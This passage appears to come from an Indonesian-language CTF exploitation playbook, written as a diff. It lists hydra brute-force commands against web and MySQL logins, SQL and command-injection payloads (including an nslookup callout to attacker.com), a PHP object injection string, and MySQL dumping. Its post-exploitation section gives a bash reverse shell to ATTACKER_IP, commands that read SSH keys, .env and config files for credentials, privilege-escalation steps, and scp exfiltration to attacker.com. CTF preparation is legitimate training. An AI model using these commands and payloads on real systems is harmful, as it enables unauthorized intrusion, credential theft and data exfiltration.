+hydra -l admin -P /usr/share/wordlists/rockyou.txt http-post-form://target.com/login:username=^USER^&password=^PASS^:Invalid -t 16
+
+Penjelasan:
+- -l = username (fixed)
+- -P = password wordlist
+- http-post-form = POST request
+- username=^USER^ = parameter untuk username
+- password=^PASS^ = parameter untuk password
+- :Invalid = error message (jika login gagal)
+- -t = threads
+
+─────────────────────────────────────────────────────────────────────────────
+
+4.10.3 SQL INJECTION IN LOGIN
+──────────────────────────────
+
+Username: admin' --
+Password: (anything)
+
+Username: admin' #
+Password: (anything)
+
+Username: ' OR '1'='1' --
+Password: (anything)
+
+# Bypass authentication:
+SELECT * FROM users WHERE username='admin' -- ' AND password='...'
+→ Query menjadi: SELECT * FROM users WHERE username='admin'
+
+─────────────────────────────────────────────────────────────────────────────
+
+4.11 INSECURE DESERIALIZATION
+───────────────────────────────
+
+4.11.1 PHP OBJECT INJECTION
+─────────────────────────────
+
+# Detect:
+curl -s https://target.com | grep -i "serialize\|unserialize"
+curl -s https://target.com/profile | grep "O:[0-9]"
+
+# Payload:
+O:4:"User":2:{s:4:"name";s:5:"admin";s:4:"role";s:5:"admin";}
+
+# Gunakan tools:
+ysoserial (untuk Java)
+phpggc (untuk PHP)
+
+─────────────────────────────────────────────────────────────────────────────
+
+4.12 COMMAND INJECTION
+───────────────────────
+
+4.12.1 TESTING
+───────────────
+
+https://target.com/ping.php?ip=8.8.8.8
+
+Test payloads:
+https://target.com/ping.php?ip=8.8.8.8; whoami
+https://target.com/ping.php?ip=8.8.8.8 && id
+https://target.com/ping.php?ip=8.8.8.8 | cat /etc/passwd
+https://target.com/ping.php?ip=8.8.8.8 `whoami`
+https://target.com/ping.php?ip=8.8.8.8 $(whoami)
+
+─────────────────────────────────────────────────────────────────────────────
+
+4.12.2 BLIND COMMAND INJECTION
+────────────────────────────────
+
+# Gunakan time delay:
+https://target.com/ping.php?ip=8.8.8.8; sleep 10
+Result: Response lama 10 detik = vulnerable
+
+# Out-of-band:
+https://target.com/ping.php?ip=8.8.8.8; nslookup $(whoami).attacker.com
+Result: DNS query ke attacker server
+
+─────────────────────────────────────────────────────────────────────────────
+
+═══════════════════════════════════════════════════════════════════════════════
+PHASE 5: DATABASE ATTACKS (MYSQL/MARIADB DIRECT)
+═══════════════════════════════════════════════════════════════════════════════
+
+5.1 PORT 3306 OPEN? BRUTE FORCE MYSQL
+───────────────────────────────────────
+
+# Setup wordlist:
+echo -e "root\nadmin\nmysql\npma\ndbuser\ntest" > users.txt
+
+# Basic brute force:
+hydra -L users.txt -P /usr/share/wordlists/fasttrack.txt mysql://target.com -t 16
+
+# Aggressive (rockyou):
+hydra -l root -P /usr/share/wordlists/rockyou.txt mysql://target.com -t 16
+
+─────────────────────────────────────────────────────────────────────────────
+
+5.2 MYSQL EMPTY PASSWORD EXPLOITATION
+────────────────────────────────────────
+
+nmap --script mysql-empty-password -p 3306 target.com
+
+# Jika Result: "authentication possible without password"
+# Login tanpa password:
+
+mysql -h target.com -u root
+
+─────────────────────────────────────────────────────────────────────────────
+
+5.3 CONNECT & DUMP MYSQL
+──────────────────────────
+
+# Connect:
+mysql -h target.com -u root -p
+
+# List database:
+SHOW DATABASES;
+
+# Access database:
+USE database_name;
+
+# List tables:
+SHOW TABLES;
+
+# Dump tabel:
+SELECT * FROM users;
+
+# Export to file:
+mysql -h target.com -u root -p -e "SELECT * FROM database.users;" > users.txt
+
+─────────────────────────────────────────────────────────────────────────────
+
+5.4 MARIADB SPECIFIC
+──────────────────────
+
+nmap --script mysql-info -p 3306 target.com
+nmap --script mysql-variables -p 3306 target.com
+
+Penjelasan: Cek configuration dan setting MariaDB
+
+─────────────────────────────────────────────────────────────────────────────
+
+═══════════════════════════════════════════════════════════════════════════════
+PHASE 6: POST EXPLOITATION & FLAG CAPTURE
+═══════════════════════════════════════════════════════════════════════════════
+
+6.1 UPGRADE SHELL
+───────────────────
+
+# Kalau dapat web shell, upgrade ke proper shell:
+python3 -c 'import pty; pty.spawn("/bin/bash")'
+
+# Atau:
+bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1
+
+# Atau (dengan handler):
+# Attacker: nc -lvnp 4444
+# Target: bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1
+
+─────────────────────────────────────────────────────────────────────────────
+
+6.2 ENUMERATE SYSTEM
+──────────────────────
+
+whoami                           # Current user
+id                               # User ID & groups
+uname -a                         # OS info
+cat /etc/os-release              # OS detail
+cat /proc/cpuinfo                # CPU info
+df -h                            # Disk space
+free -h                          # Memory
+netstat -an                      # Network connections
+ps aux                           # Running processes
+sudo -l                          # Sudo permissions
+
+─────────────────────────────────────────────────────────────────────────────
+
+6.3 CARI FLAG
+──────────────
+
+# Flag biasanya:
+find / -name "flag*" 2>/dev/null
+find / -name "*flag*" 2>/dev/null
+find / -type f -name "*{flag,ctf,token}" 2>/dev/null
+
+# Cek user home:
+cat ~/*
+ls -la ~/.*
+
+# Cek root:
+cat /root/flag (jika root access)
+
+# Cek common locations:
+cat /var/www/html/flag
+cat /var/www/html/.env
+cat /home/user/flag
+cat /home/*/flag
+
+─────────────────────────────────────────────────────────────────────────────
+
+6.4 CARI CREDENTIALS
+──────────────────────
+
+# Database credentials:
+cat /var/www/html/config.php
+cat /var/www/html/wp-config.php
+cat .env
+
+# SSH keys:
+ls -la ~/.ssh/
+cat ~/.ssh/id_rsa
+
+# Passwords dalam history:
+history | grep -i password
+cat ~/.bash_history | grep -i password
+
+# Sudoers file:
+sudo cat /etc/sudoers
+
+─────────────────────────────────────────────────────────────────────────────
+
+6.5 PRIVILEGE ESCALATION
+──────────────────────────
+
+# SUID binaries (run sebagai owner, bukan current user):
+find / -perm -u=s -type f 2>/dev/null
+
+# Example SUID exploits:
+# /usr/bin/sudo, /usr/bin/passwd, /usr/local/bin/custom
+
+# Cek sudo permissions:
+sudo -l
+
+# Jika: (ALL) NOPASSWD: /bin/bash
+# Maka: sudo /bin/bash → instant root
+
+# Wildcard exploitation (dalam cronjob):
+# Contoh: tar czf /var/backup/backup.tar.gz /home/user/*
+# Exploit: create symlink ke /etc/passwd
+
+# Cron job exploitation:
+cat /etc/crontab
+cat /var/spool/cron/crontabs/
+
+# Kernel exploit:
+uname -a → cek kernel version
+searchsploit kernel → cari CVE
+
+─────────────────────────────────────────────────────────────────────────────
+
+6.6 WINDOWS PRIVILEGE ESCALATION (Jika target Windows)
+──────────────────────────────────────────────────────
+
+whoami /priv                      # Check privileges
+systeminfo                        # System information
+wmic qfe list                     # Installed patches
+Get-LocalUser                     # Local users (PowerShell)
+Get-LocalGroup                    # Local groups
+Get-Acl C:\Windows\System32       # File permissions
+
+# Unquoted Service Path:
+# Cek: wmic service list brief
+# Exploit jika path tidak di-quote
+
+─────────────────────────────────────────────────────────────────────────────
+
+6.7 DATA EXFILTRATION
+───────────────────────
+
+# Transfer file ke attacker:
+scp sensitive_file.txt attacker@attacker.com:/tmp/
+
+# Atau via http:
+python3 -m http.server 8000  # On target
+wget http://target.com:8000/sensitive_file  # On attacker
+
+# Database dump:
+mysqldump -u root -p --all-databases > backup.sql
+
+# Compress & encrypt:
+tar czf data.tar.gz /var/www/html/
+gpg -c data.tar.gz
+
+─────────────────────────────────────────────────────────────────────────────
+
+═══════════════════════════════════════════════════════════════════════════════
+PHASE 7: URUTAN KERJA TERBAIK SAAT KOMPETISI CTF
+═══════════════════════════════════════════════════════════════════════════════
+
+TIME MANAGEMENT (Asumsikan 4-5 jam kompetisi):
+
+[00:00 - 00:30] RECONNAISSANCE
+├─ whatweb
+├─ curl headers
+├─ DNS enumeration
+└─ Subdomain search
+
+[00:30 - 01:00] PORT SCANNING
+├─ nmap basic
+├─ MySQL check
+└─ Service identification
+
+[01:00 - 01:30] WEB ENUMERATION
+├─ Directory brute force
+├─ File discovery
+└─ API endpoint search
+
+[01:30 - 02:30] QUICK EXPLOITATION (START WITH EASY ONES)
+├─ SQL Injection (sqlmap - fastest)
+├─ XSS testing
+├─ Try default credentials
+└─ MySQL brute force (jika port 3306 open)
+
+[02:30 - 03:30] ADVANCED EXPLOITATION (JIKA MASIH STUCK)
+├─ LFI/RFI
+├─ Upload vulnerabilities
+├─ SSTI/XXE
+└─ Manual testing
+
+[03:30 - 04:00] POST EXPLOITATION & FLAG CAPTURE
+├─ Enumerate system
+├─ Find flags
+└─ Document findings
+
+[04:00 - 05:00] BONUS (Jika masih ada waktu)
+├─ Privilege escalation
+├─ Database dumping
+└─ Try other techniques
+
+─────────────────────────────────────────────────────────────────────────────
+
+PRIORITAS EXPLOITATION:
+1. ⭐⭐⭐ SQL Injection (paling umum)
+2. ⭐⭐⭐ XSS (paling mudah di-detect)
+3. ⭐⭐⭐ Default credentials (try first!)
+4. ⭐⭐ LFI/RFI
+5. ⭐⭐ IDOR
+6. ⭐⭐ File upload
+7. ⭐ SSTI/XXE
+8. ⭐ Deserialization
+
+─────────────────────────────────────────────────────────────────────────────
+
+═══════════════════════════════════════════════════════════════════════════════
+PHASE 8: DEBUGGING & TIPS SAAT STUCK
+═══════════════════════════════════════════════════════════════════════════════
+
+JIKA SQLMAP TIDAK BEKERJA:
+1. Cek apakah parameter benar-benar vulnerable
+2. Coba manual testing dengan payload
+3. Test di parameter lain (POST body, cookie, header)
+4. Coba --string atau --dbs tanpa --batch
+
+JIKA XSS TIDAK MUNCUL:
+1. Cek apakah input benar-benar di-reflect (View Page Source)
+2. Coba payload lain (img onerror, svg onload, dll)
+3. Cek apakah ada WAF/filter
+4. Coba URL encoding, double encoding
+
+JIKA DIRECTORY BRUTE FORCE TIDAK KETEMU APA-APA:
+1. Change wordlist (gunakan wordlist yang lebih besar)
+2. Coba extension lain (-e php5,phtml,txt,env, dll)
+3. Cek robots.txt & sitemap.xml
+4. Coba parameter discovery (-w paramspider/params.txt)
+
+JIKA STUCK TOTAL:
+1. Re-examine reconnaissance findings
+2. Cari vulnerability yang obvious (error messages, debug info)
+3. Coba brute force login
+4. Check jika ada vulnerability di teknologi yang terdeteksi
+5. Try social engineering (cari email, coba password reset)
+
+─────────────────────────────────────────────────────────────────────────────
+
+═══════════════════════════════════════════════════════════════════════════════
+PHASE 9: TOOLS CHEATSHEET
+═══════════════════════════════════════════════════════════════════════════════
+
+RECONNAISSANCE:
+nmap, nslookup, dig, curl, whatweb, subfinder, dnsenum, dnsrecon, whois,
+openssl s_client, theHarvester, assetfinder, amass
+
+WEB SCANNING:
+ffuf, dirsearch, nikto, wafw00f, wappalyzer, burp suite (community)
+
+SQL INJECTION:
+sqlmap, sqlninja
+
+XSS & CLIENT-SIDE:
+dalfox, xsstrike, burp suite
+
+FILE INCLUSION:
+lfisuite, fuxploider
+
+BRUTE FORCE:
+hydra, hashcat, john, crunch, medusa
+
+DATABASE:
+mysql, mariadb, mongodb, postgres clients
+
+REVERSE ENGINEERING:
+strings, binwalk, ghidra, objdump
+
+PRIVILEGE ESCALATION:
+linpeas.sh, winpeas.exe, GTFObins
+
+─────────────────────────────────────────────────────────────────────────────
+
+═══════════════════════════════════════════════════════════════════════════════
+PHASE 10: TEMPLATE DOKUMENTASI (UNTUK LAPORAN/SUBMISI)
+═══════════════════════════════════════════════════════════════════════════════
+
+TARGET INFORMATION:
+├─ Domain: ___________________
+├─ IP Address: ___________________
+├─ Service Ports: ___________________
+└─ Technology Stack: ___________________
+
+RECONNAISSANCE FINDINGS:
+├─ Subdomains Found:
+│  ├─ ___________________
+│  ├─ ___________________
+│  └─ ___________________
+├─ Technologies Detected:
+│  ├─ CMS: ___________________
+│  ├─ Framework: ___________________
+│  └─ Server: ___________________
+└─ DNS Records:
+   ├─ A Record: ___________________
+   ├─ MX Record: ___________________
+   └─ TXT Record: ___________________
+
+VULNERABILITIES FOUND:
+├─ Vulnerability 1:
+│  ├─ Type: ___________________
+│  ├─ Severity: [CRITICAL/HIGH/MEDIUM/LOW]
+│  ├─ Location: ___________________
+│  ├─ Proof of Concept: ___________________
+│  └─ Flag: ___________________
+│
+├─ Vulnerability 2:
+│  ├─ Type: ___________________
+│  ├─ Severity: [CRITICAL/HIGH/MEDIUM/LOW]
+│  ├─ Location: ___________________
+│  ├─ Proof of Concept: ___________________
+│  └─ Flag: ___________________
+│
+└─ Vulnerability 3:
+   ├─ Type: ___________________
+   ├─ Severity: [CRITICAL/HIGH/MEDIUM/LOW]
+   ├─ Location: ___________________
+   ├─ Proof of Concept: ___________________
+   └─ Flag: ___________________
+
+CREDENTIALS OBTAINED:
+├─ MySQL Credentials:
+│  ├─ Username: ___________________
+│  └─ Password: ___________________
+├─ Admin Credentials:
+│  ├─ Username: ___________________
+│  └─ Password: ___________________
+└─ SSH Credentials:
+   ├─ Username: ___________________
+   └─ Password/Key: ___________________
+
+DATA EXTRACTED:
+├─ Database Dump: ___________________
+├─ Sensitive Files: ___________________
+└─ Configurations: ___________________
+
+FLAGS CAPTURED:
+├─ Flag 1: ___________________
+├─ Flag 2: ___________________
+└─ Flag 3: ___________________
+
+─────────────────────────────────────────────────────────────────────────────
+
+═══════════════════════════════════════════════════════════════════════════════
+IMPORTANT REMINDERS
+═══════════════════════════════════════════════════════════════════════════════
+
+✓ Selalu catat SETIAP hasil command
+✓ Jangan pernah langsung exploit, lakukan recon dulu
+✓ Kalau stuck, ganti teknik (jangan fokus 1 vulnerability)
+✓ Time management penting - jangan terlalu lama 1 task
+✓ Dokumentasi yang bagus = menang dengan mudah
+✓ Siapkan wordlist & tools sebelum kompetisi dimulai
+✓ Kerja sistematis dan tetap tenang
+✓ Dalam kompetisi, yang cepat menemukan = yang menang
+✓ Verifikasi flag sebelum submit (hindari typo)
+✓ Backup hasil penting (screenshot, command history)
+
+═══════════════════════════════════════════════════════════════════════════════
+                                END OF PLAYBOOK
+═══════════════════════════════════════════════════════════════════════════════
+
